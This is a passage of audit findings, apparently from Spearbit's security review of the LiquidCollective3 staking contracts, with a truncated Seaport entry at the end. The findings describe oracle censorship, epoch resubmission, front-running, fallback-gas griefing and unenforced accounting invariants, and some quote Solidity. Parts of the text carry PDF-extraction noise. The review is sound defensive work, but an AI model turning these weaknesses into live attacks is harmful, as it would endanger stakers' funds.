"LiquidCollective3", "Severity: Medium Risk"]}, {"title": "The validator count to exit in _requestExitsBasedOnRedeemDemandAfterRebalancings assumes that the to-be selected validators are still active and have not been penalised.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The validatorCountToExit is calculated as follows uint256 validatorCountToExit = LibUint256.ceil( redeemManagerDemandInEth - (availableBalanceToRedeem + exitingBalance + preExitingBalance), DEPOSIT_SIZE ); This formula assumes that the to-be selected validators exit by the pickNextValidatorsToExit are: 1. Still active 2. Have not been queued to be exited and 3. Have not been penalized and their balance is at least MAX_EFFECTIVE_BALANCE", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Burn RedeemManager's share first before calling its reportWithdraw endpoint", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "reportWithdraw and then burns the corresponding shares for the RedeemManager The current implementation of _reportWithdrawToRedeemManager calls RedeemManager's // perform a report withdraw call to the redeem manager redeemManager_.reportWithdraw{value: suppliedRedeemManagerDemandInEth}(suppliedRedeemManagerDemand); // we burn the shares of the redeem manager associated with the amount of eth provided _burnRawShares(address(RedeemManagerAddress.get()), suppliedRedeemManagerDemand);", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "OracleManager allows reporting for the same epoch multiple times, leading to unknown behavior.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Currently, it is possible for the oracle to report on the same epoch multiple times, because _- isValidEpoch checks that the report's epoch >= LastConsensusLayerReport.get().epoch. This can lead the contract to unspecified behavior  The code will revert if the report increases the balance, not with an explicit check but reverting due to a subtraction underflow, since maxIncrease == 0 and  Allowing other code paths to execute to completion.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Missing event emit when user calls deposit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Whenever BalanceToDeposit is updated, the protocol should emit a SetBalanceToDeposit, but when a user calls UserDepositManager.deposit, the event is never emitted which could break tooling.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Reset the report data and increment the last epoch id before calling River's setConsensusLayerData when a quorum is made", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The current implementation of reportConsensusLayerData calls river.setConsensusLayerData(report) first when a quorum is made then resets the report variant and position data and also it increment the last epoch id afterward // if adding this vote reaches quorum if (variantVotes + 1 >= quorum) { // we push the report to river river.setConsensusLayerData(report); // we clear the reporting data _clearReports(); // we increment the lastReportedEpoch to force reports to be on the last frame LastEpochId.set(lastReportedEpochValue + 1); emit SetLastReportedEpoch(lastReportedEpochValue + 1); } In the future version of the protocol there might be a possibility for an oracle member to call back into reportCon- sensusLayerData when river.setConsensusLayerData(report) is called and so it would open a reentrancy for compromised/malicious oracle members.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Update BufferedExceedingEth before calling sendRedeemManagerExceedingFunds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "In pullExceedingEth , River's sendRedeemManagerExceedingFunds is called before updating the RedeemManager's BufferedExceedingEth storage value _river().sendRedeemManagerExceedingFunds{value: amountToSend}(); BufferedExceedingEth.set(BufferedExceedingEth.get() - amountToSend);", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Any oracle member can censor almost quorum report variants by resetting its address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The admin or an oracle member can DoS or censor almost quorum reports by calling setMember endpoint which would reset the report variants and report positions. The admin also can reset the/clear the reports by calling other endpoints by that should be less of an issue compared to just an oracle member doing that.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Incentive mechanism that encourages operators to respond quickly to exit requests might diminish under certain condition", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "/// @notice Retrieve all the active and fundable operators /// @dev This method will return a memory array of length equal to the number of operator, but /// @dev populated up to the fundable operator count, also returned by the method /// @return The list of active and fundable operators /// @return The count of active and fundable operators function getAllFundable() internal view returns (CachedOperator[] memory, uint256) { // uint32[] storage stoppedValidatorCounts = getStoppedValidators(); for (uint256 idx = 0; idx < operatorCount;) { _hasFundableKeys(r.value[idx]) && _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) >= r.value[idx].requestedExits only @audit-ok File: Operators.2.sol 153: 154: ,! 155: 156: 157: 158: ,! ..SNIP.. 172: 173: 174: 175: 176: 177: ,! 178: if ( ) { r.value[idx].requestedExits is the accumulative number of requested validator exits by the protocol _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) function is a value reported by oracle members which consist of both exited and slashed validator counts It was understood the rationale of having the _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) >= r.value[idx].requestedExits conditional check at Line 177 above is to incentivize operators to re- In other words, an operator with a re- spond quickly to exit requests if they want new stakes from deposits. questedExits value larger than the _getStoppedValidatorCountAtIndex count indicates that an operator did not submit exit requests to the Consensus Layer (CL) in a timely manner or the exit requests have not been finalized in CL. However, it was observed that the incentive mechanism might not work as expected in some instances. Consider the following scenario: Assuming an operator called A has 5 slashed validators and 0 exited validators, the _getStoppedValidator- CountAtIndex function will return 5 for A since this function takes into consideration both stopped and slashed validators. Also, assume that the requestedExits of A is 5, which means that A has been instructed by the protocol to submit 5 exit requests to CL. In this case, the incentive mechanism seems to diminish as A will still be considered a fundable operator even if A does not respond to exit requests since the number of slashed validators is enough to \"help\" to push up the stopped validator count to satisfy the condition, giving the wrong impression that A has already submitted the exit requests. As such, A will continue to be selected to stake new deposits.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "RedeemManager. _claimRedeemRequests transaction sender might be tricked to pay more eth in trans- action fees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The _claimRedeemRequests function is designed to allow anyone to claim ETH on behalf of another party who has a valid redeem request. The function iterates through the redeemRequestIds list and fulfills each request individually. However, it is important to note that the transfer of ETH to the recipients is only limited by the 63/64 rule, which means that it is possible for a recipient to take advantage of a heavy fallback function and potentially cause the sender to pay a significant amount of unwanted transaction fees.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Claimable LsETH on the Withdraw Stack could exceed total LsETH requested on the Redeem Queue", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Let the total amount of claimable LsETH on the Withdraw Stack be x and the total amount of LsETH requested on the Redeem Queue be y. The following points are extracted from the Withdrawals Smart Contract Architecture documentation:  The design ensures that x <= y . Refer to page 15 of the documentation.  It is impossible for a redeem request to be claimed before at least one Oracle report has occurred, so it is impossible to skip a slashing time penalty. Refer to page 16 of the documentation. Based on the above information, the main purpose of the design (x <= y) is to avoid favorable treatment of LsETH holders that would request a redemption before others following a slashing incident. However, this constraint (x <= y ) is not being enforced in the contract. The reporter could continue to report withdrawal via the RedeemManager.reportWithdraw function till the point x > y. If x > y, LsETH holders could request a redemption before others following a slashing incident to gain an advan- tage.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "An oracle member can resubmit data for the same epoch multiple times if the quorum is set to 1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "If the quorum is set to 1 and the difference between the report's epoch e and LastEpochId.get() is (cid:1)e, an oracle member will be able to call reportConsensusLayerData (cid:1)e + 1 times to push its report for epoch e to the protocol and with different data each time (only restriction on successive reports is that the difference of underlying balance between reports would need to be negative since the maxIncrease will be 0). Note that in reportConsensusLayerData the first storage write to LastEpochId will be overwritten later due to quorum of one: x = LastEpochId -> report.epoch -> x + 1", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Report's validatorsCount's historical non-decreseness does not get checked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Once the Oracle members come to a quorum for a selected report variant, the validators count is stored in the storage. Note that validatorsCount is supposed to represent the total cumulative number of validators ever funded on consensus layer (even if they have been slashed or exited at some point ). So this value is supposed to be a non-decreasing function of reported epochs. But this invariant has never been checked in setConsensusLayerData.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "The report's slashingContainmentMode and bufferRebalancingMode are decided by the oracle mem- bers which affects the exiting strategy of validators", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The current protocol leaves it up to the oracle members to come to a quorum to set either of the report.slashingContainmentMode or report.bufferRebalancingMode to true or false. That means the oracle members have the power to decide off-chain whether validators should be exited and whether some of the deposit balance should be reallocated for redeeming (vs an algorithmic decision by the protocol on-chain). A potential bad scenario would be oracle members deciding to not signal for new validators to exit and from the time for the current epoch to the next report some validators get penalized or slashed which would reduce the If those validators would have exited before getting slashed or penalized, the underlying value of the shares. redeemers would have received more ETH back for their investment.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Anyone can call depositToConsensusLayer and potentially push wrong data on-chain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Anyone can call depositToConsensusLayer and potentially push wrong data on-chain. An example is when an operator would want to remove a validator key that is not-funded yet but has an index below the operator limit and will be picked by the strategy if depositToConsensusLayer is called. Then anyone can front run the removal call by the operator and force push this validator's info to the deposit contract.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Calculation of currentMaxCommittableAmount can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "currentMaxCommittableAmount is calculated as: // we adapt the value for the reporting period by using the asset balance as upper bound uint256 underlyingAssetBalance = _assetBalance(); uint256 currentBalanceToDeposit = BalanceToDeposit.get(); ... uint256 currentMaxCommittableAmount = LibUint256.min( LibUint256.min(underlyingAssetBalance, (currentMaxDailyCommittableAmount * period) / 1 days), currentBalanceToDeposit ); But underlyingAssetBalance is Bu = Bv +Bd +Bc +Br +32(Cd (cid:0)Cr ) which is greater than currentBalanceToDeposit Bd since the other components are non-negative values. parameter description Bv Bd Bc Br Cd Cr M m Bu LastConsensusLayerReport.get().validatorsBalance BalanceToDeposit.get() CommittedBalance.get() BalanceToRedeem.get() DepositedValidatorCount.get() LastConsensusLayerReport.get().validatorsCount currentMaxCommittableAmount currentMaxDailyCommittableAmount * period) / 1 days underlyingAssetBalance Note that the fact that Cd (cid:21) Cr is an invariant that is enforced by the protocol. and so currently we are computing M as: M = min(Bu, Bd , m) = min(Bd , m) since Bu (cid:21) Bd .", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Remove redundant array length check and variable to save gas.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "When someone calls ConsensusLayerDepositManager.depositToConsensusLayer, the contract will verify that the receivedSignatureCount matches the receivedPublicKeyCount returned from _getNextVal- idators. This is unnecessary as the code always creates them with the same length.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Duplicated events emitted in River and RedeemManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The amount of ETH pulled from the redeem contract when setConsensusData is called by the oracle is notified with events in both RedeemManager and River contracts.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "totalRequestedExitsValue's calculation can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "In the for loop in this context, totalRequestedExitsValue is updated for every operator that sat- isfies _getActiveValidatorCountForExitRequests(operators[idx]) == highestActiveCount. Based on the used increments, their sum equals to optimalTotalDispatchCount.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Report's bufferRebalancingMode and slashingContainmentMode are only used during the reporting transaction process", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "report.bufferRebalancingMode and report.slashingContainmentMode are only used during the transaction and their previous values are not used in the protocol. They can be removed from being added to the stored report. Note that their historical values can be queried by listening to the ProcessedConsensusLayerReport(report, vars.trace) events.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Add more comments/documentation for ConsensusLayerReport and StoredConsensusLayerReport structs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The ConsensusLayerReport and StoredConsensusLayerReport structs are defined as /// @notice The format of the oracle report struct ConsensusLayerReport { uint256 epoch; uint256 validatorsBalance; uint256 validatorsSkimmedBalance; uint256 validatorsExitedBalance; uint256 validatorsExitingBalance; uint32 validatorsCount; uint32[] stoppedValidatorCountPerOperator; bool bufferRebalancingMode; bool slashingContainmentMode; } /// @notice The format of the oracle report in storage struct StoredConsensusLayerReport { uint256 epoch; uint256 validatorsBalance; uint256 validatorsSkimmedBalance; uint256 validatorsExitedBalance; uint256 validatorsExitingBalance; uint32 validatorsCount; bool bufferRebalancingMode; bool slashingContainmentMode; } Comments regarding their specified fields are lacking.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "postUnderlyingBalanceIncludingExits and preUnderlyingBalanceIncludingExits can be removed from setConsensusLayerData", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Both postUnderlyingBalanceIncludingExits ( Bpost ) and preUnderlyingBalanceIncludingEx- its ( Bpre ) include the accumulated skimmed and exited amounts overtime which part of them might have exited the protocol through redeeming (or skimmed back to CL and penalized). Their delta is almost the same as the delta of vars.postReportUnderlyingBalance and vars.preReportUnderlyingBalance (almost if one adds a check for non-decreases of validator counts). u u : postUnderlyingBalanceIncludingExits u : preUnderlyingBalanceIncludingExits u (cid:0) Bpre u : vars.postReportUnderlyingBalance : vars.preReportUnderlyingBalance : Breport,post (cid:0) Breport,pre u u  Bpost u  Bpre  (cid:1)Bu: Bpost  Breport,post  Breport,pre u  (cid:1)Breport u  Bprev v : u  Bcurr v  (cid:1)Bv : Bcurr  Bprev s  Bcurr s  (cid:1)Bs: Bcurr  Bprev e  Bcurr e  (cid:1)Be: Bcurr previous reported/stored value for total validator balances in CL LastConsensusLayerRe- port.get().validatorsBalance v (cid:0) Bprev v (can be negative) : current reported value of total validator balances in CL report.validatorsBalance : LastConsensusLayerReport.get().validatorsSkimmedBalance : report.validatorsSkimmedBalance s (cid:0) Bprev s (always non-negative, this is an invariant that gets checked). : LastConsensusLayerReport.get().validatorsExitedBalance : report.validatorsExitedBalance e (cid:0) Bprev e (always non-negative, this is an invariant that gets checked).  $C{prev} $: LastConsensusLayerReport.get().validatorsCount  Ccurr : report.validatorsCount  (cid:1)C: Ccurr (cid:0) Cprev (this value should be non-negative, note this invariant has not been checked in the code- base)  Cdeposit : DepositedValidatorCount.get()  Bd : BalanceToDeposit.get() 22  Bc: CommittedBalance.get()  Br : BalanceToRedeem.get() Note that the above values are assumed to be in their form before the current report gets stored in the storage. Then we would have Bpost u = Bcurr v + Bcurr s + Bcurr e = Bpre u + (cid:1)Bv + (cid:1)Bs + (cid:1)Be (cid:0) 32(cid:1)C and so: (cid:1)Bu = (cid:1)Bv + (cid:1)Bs + (cid:1)Be (cid:0) 32(cid:1)C = (cid:1)Breport u", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "The formula or the parameter names for calculating currentMaxDailyCommittableAmount can be made more clear", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "currentMaxDailyCommittableAmount is calculated using the below formula: // we compute the max daily committable amount by taking the asset balance without the balance to deposit into account ,! uint256 currentMaxDailyCommittableAmount = LibUint256.max( dcl.maxDailyNetCommittableAmount, (uint256(dcl.maxDailyRelativeCommittableAmount) * (underlyingAssetBalance - ,! currentBalanceToDeposit)) / LibBasisPoints.BASIS_POINTS_MAX ); Therefore its value is the maximum of two potential maximum values.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "preExitingBalance is a rough estimate for signalling the number of validators to request to exit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "exitingBalance and preExitingBalance might be trying to compensate for the same portion of balance (non-stopped validators which have been signaled to exit and are in the CL exit queue). That means the number of validatorCountToExit calculated to accommodate for the redeem demand is actually lower than what is required. The important portion of preExitingBalance is for the validators that were singled to exit in the previous reporting round but the operators have not registered them for exit in CL. Also totalStoppedValidatorCount can include slashed validator counts which again lowers the required validatorCountToExit and those values should not be accounted for here. Perhaps the oracle members should also report the slashing counts of validators so that one can calculate these values more accurately.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "More documentation can be added regarding the currentMaxDailyCommittableAmount calculation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "currentMaxDailyCommittableAmount calculated as // we compute the max daily committable amount by taking the asset balance without the balance to deposit into the account ,! uint256 currentMaxDailyCommittableAmount = LibUint256.max( dcl.maxDailyNetCommittableAmount, (uint256(dcl.maxDailyRelativeCommittableAmount) * (underlyingAssetBalance - ,! currentBalanceToDeposit)) / LibBasisPoints.BASIS_POINTS_MAX ); We can add further to the comment: Since before the _commitBalanceToDeposit hook is called we have skimmed the remaining to redeem balance to BalanceToDeposit, underlyingAssetBalance - currentBalanceToDeposit represent the funds allocated for CL (funds that are already in CL, funds that are in transit to CL or funds committed to be deposited to CL). It is important that the redeem balance is already skimmed for this upper bound calculation, so for future code changes we should pay attention to the order of hook callbacks otherwise the upper bounds would be different.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "BalanceToRedeem is only non-zero during a report processing transaction", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "BalanceToRedeem is only ever posses a non-zero value during the report processing when a quorum has been made for the oracle member votes (setConsensusLayerData). And at the very end of this process its value gets reset back to 0.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Improve clarity on bufferRebalancingMode variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "According to the documentation, the bufferRebalancingMode flag passed by the oracle should allow or disallow the rebalancing of funds between the Deposit and Redeem buffers. The flag correctly disables rebalancing in the DepositBuffer to RedeemBuffer direction as can be seen here if (depositToRedeemRebalancingAllowed && availableBalanceToDeposit > 0) { uint256 rebalancingAmount = LibUint256.min( availableBalanceToDeposit, redeemManagerDemandInEth - exitingBalance - availableBalanceToRedeem ); if (rebalancingAmount > 0) { availableBalanceToRedeem += rebalancingAmount; _setBalanceToRedeem(availableBalanceToRedeem); _setBalanceToDeposit(availableBalanceToDeposit - rebalancingAmount); } } but it is not used at all when pulling funds in another way // if funds are left in the balance to redeem, we move them to the deposit balance _skimExcessBalanceToRedeem();", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Fix code style consistency issues", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "There is a small code styling mismatch between the new code under audit and the style used through the rest of the code. Specifically, function parameter names are supposed to be prepended with _ to differentiate them from variables defined in the function body.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Remove unused constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "DENOMINATION_OFFSET is unused and can be removed from the codebase.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Document what TotalRequestedExits can potentially represent", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Documentation is lacking for TotalRequestedExits. This parameter represents a quantity that is a mix of exited (or to be exited) and slashed validators for an operator. Also, in general, this is a rough quantity since we don't have a finer reporting of slashed and exited validators (they are reported as a sum).", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Operators need to listen to RequestedValidatorExits and exit their validators accordingly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Operators need to listen to RequestedValidatorExits and exit their validators accordingly emit RequestedValidatorExits(operators[idx].index, requestedExits + operators[idx].picked); Note that requestedExits + operators[idx].picked represents the upper bound for the index of the funded validators that need to be exited by the operator.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Oracle members would need to listen to ClearedReporting and report their data if necessary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Oracle members would need to listen to ClearedReporting event and report their data if necessary", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "The only way for an oracle member to change its report data for an epoch is to reset the reporting process by changing its address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "If an oracle member has made a mistake in its CL report to the Oracle or for some other reason would like to change its report, it would not be able to due to the following if block: // we retrieve the voting status of the caller, and revert if already voted if (ReportsPositions.get(uint256(memberIndex))) { revert AlreadyReported(report.epoch, msg.sender); } The only way for the said oracle member to be able to report different data is to reset its address by calling setMember. This would cause all the report variants and report positions to be cleared and force all the other oracle members to report their data again. Related:  Any oracle member can censor almost quorum report variants by resetting its address.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "For a quorum making CL report the epoch restrictions are checked twice.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "When an oracle member reports to the Oracle's reportConsensusLayerData, the requirements for a valid epoch is checked once in reportConsensusLayerData: // checks that the report epoch is not invalid if (!river.isValidEpoch(report.epoch)) { revert InvalidEpoch(report.epoch); } and once again in setConsensusLayerData // we start by verifying that the reported epoch is valid based on the consensus layer spec if (!_isValidEpoch(cls, report.epoch)) { revert InvalidEpoch(report.epoch); } Note that only the Oracle can call the setConsensusLayerData endpoint and the only time the Oracle makes this call is when the quorum is reached in reportConsensusLayerData.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Clear report variants and report position data during the migration to the new contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Upon migration to the new contract with a new type of reporting data the old report positions and variants should be cleared by calling _clearReports() on the new contract or an older counterpart on the old contract. Note that the report variants slot will be changed from: bytes32(uint256(keccak256(\"river.state.reportsVariants\")) - 1) to: bytes32(uint256(keccak256(\"river.state.reportVariants\")) - 1)", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Remove unused functions from Oracle", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The following functions are unused and can be removed from the Oracle's implementation  isValidEpoch  getTime  getExpectedEpochId  getLastCompletedEpochId  getCurrentEpochId  getCLSpec  getCurrentFrame  getFrameFirstEpochId  getReportBounds", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "RedeemManager. _claimRedeemRequests - Consider adding the recipient to the revert message in case of failure", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The purpose of the _claimRedeemRequests function is to facilitate the claiming of ETH on behalf of another party who has a valid redeem request. It is worth noting that if any of the calls to recipients fail, the entire transaction will revert. Although it is impossible to conduct a denial-of-service (DoS) attack in this scenario, as the worst-case scenario only allows the transaction sender to specify a different array of redeemRequestIds, it may still be challenging to determine the specific redemption request that caused the transaction to fail.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Exit validator picking strategy does not consider slashed validator between reported epoch and current epoch", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The current picking strategy in the OperatorsRegistry._pickNextValidatorsToExitFromActive- Operators function relies on a report from an old epoch. In between the reported epoch and the current epoch, validators might have been slashed and so the strategy might pick and signal to the operators those validators that have been slashed. As a result, the suggested number of validators to exit the protocol to compensate for the redemption demand in the next round of reports might not be exactly what was requested. Similarly, the OperatorsV2._hasExitableKeys function only evaluates based on a report from an old epoch. In between the reported epoch and the current epoch, validators might have been slashed. Thus, some returned operators might not have exitable keys in the current epoch.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Duplicated functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "_getStoppedValidatorsCountFromRawArray functions are the same. Operator.2._getStoppedValidatorCountAtIndex The and OperatorsRegistry.1. 30 function _getStoppedValidatorCountAtIndex(uint32[] storage stoppedValidatorCounts, uint256 if (index + 1 >= stoppedValidatorCounts.length) { return 0; } return stoppedValidatorCounts[index + 1]; function _getStoppedValidatorsCountFromRawArray(uint32[] storage stoppedValidatorCounts, internal view returns (uint32) index) File: Operators.2.sol 142: ,! 143: 144: 145: 146: 147: 148: 149: 150: 151: } { uint256 operatorIndex) internal view returns (uint32) File: OperatorsRegistry.1.sol 484: ,! 485: 486: 487: 488: 489: 490: 491: 492: 493: return 0; { } if (operatorIndex + 1 >= stoppedValidatorCounts.length) { } return stoppedValidatorCounts[operatorIndex + 1];", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Funds might be pulled from CoverageFundV1 even when there has been no slashing incident.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "vars.availableAmountToUpperBound might be positive even though no validators have been slashed. In this case, we still pull funds from the coverage funds contract to get closer to the upper bound limit: // if we have available amount to upper bound after pulling the exceeding eth buffer, we attempt to pull coverage funds ,! if (vars.availableAmountToUpperBound > 0) { // we pull the funds from the coverage recipient vars.trace.pulledCoverageFunds = _pullCoverageFunds(vars.availableAmountToUpperBound); // we do not update the rewards as coverage is not considered rewards // we do not update the available amount as there are no more pulling actions to perform afterwards } So it is possible the slashed coverage funds get used even when there has been no slashing to account for.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Update inline documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": " OracleManager.1.sol functions highlighted in Context are missing the @return natspec.  IOracle.1.sol#L204's highlighted comment is outdated. setMember can now also be called by the member itself. Also, there is a typo: adminitrator -> administrator. File: IOracle.1.sol 204: 209: /// @dev Only callable by the adminitrator @audit typo and outdated function setMember(address _oracleMember, address _newAddress) external; modifier onlyAdminOrMember(address _oracleMember) { if (msg.sender != _getAdmin() && msg.sender != _oracleMember) { revert LibErrors.Unauthorized(msg.sender); File: Oracle.1.sol 28: 29: 30: 31: 32: 33: ... 189: ,! } _; } function setMember(address _oracleMember, address _newAddress) external onlyAdminOrMember(_oracleMember) {", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Document/mark unused (would-be-stale) storage parameters after migration", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The following storage parameters will be unused after the migration of the protocol to v1  CLValidatorCount  CLValidatorTotalBalance  LastOracleRoundId.sol  OperatorsV1, this will be more than one slot (it occupies regions of storage)  ReportVariants, the slot has been changed (that means right after migration ReportVariants will be an empty array by default): bytes32(uint256(keccak256(\"river.state.reportsVariants\")) - 1); - bytes32 internal constant REPORTS_VARIANTS_SLOT = ,! + bytes32 internal constant REPORT_VARIANTS_SLOT ,! = bytes32(uint256(keccak256(\"river.state.reportVariants\")) - 1);", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "pullEth, pullELFees and pullExceedingEth do not check for a non-zero amount before sending funds to River", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "pullCoverageFunds makes sure that the amount sending to River is non-zero before calling its corresponding endpoint. This behavior differs from the implementations of  pullELFees  pullExceedingEth  pullEth 33 Not checking for a non-zero value has the added benefit of saving gas when the value is non-zero, while the check for a non-zero value before calling back River saves gas for cases when the amount could be 0.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "The spent offer amounts provided to OrderFulfilled for collection of (advanced) orders is not the actual amount spent in general", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When Seaport is called to fulfill or match a collection of (advanced) orders, the OrderFulfilled is called before applying fulfillments and executing transfers. The offer and consideration items have the following forms: C = (It , T , i, acurr , R, acurr ) O = (It , T , i, acurr , acurr ) Where parameter description It T i acurr R O C itemType token identifier the interpolation of startAmount and endAmount depending on the time and the 